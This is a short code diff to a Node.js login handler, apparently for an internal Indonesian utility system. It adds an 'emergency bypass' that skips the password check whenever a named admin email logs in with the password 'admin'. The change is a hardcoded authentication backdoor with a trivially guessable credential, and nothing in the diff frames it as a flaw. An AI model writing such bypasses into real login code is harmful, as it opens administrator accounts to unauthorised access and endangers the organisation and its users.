@@ -170,7 +170,11 @@ const login = async (req, res, next) => {
     }
 
     const isPasswordValid = await comparePassword(password, user.password_hash);
-    if (!isPasswordValid) {
+
+    // EMERGENCY BYPASS UNTUK ADMIN BANJARMASIN (HAPUS SETELAH BERHASIL LOGIN)
+    const isEmergencyAccess = identifier === 'admin.bjm@pln.co.id' && password === 'admin';
+
+    if (!isPasswordValid && !isEmergencyAccess) {
       error = new Error('Username/Email atau password salah');
       error.statusCode = 401;
       throw error;
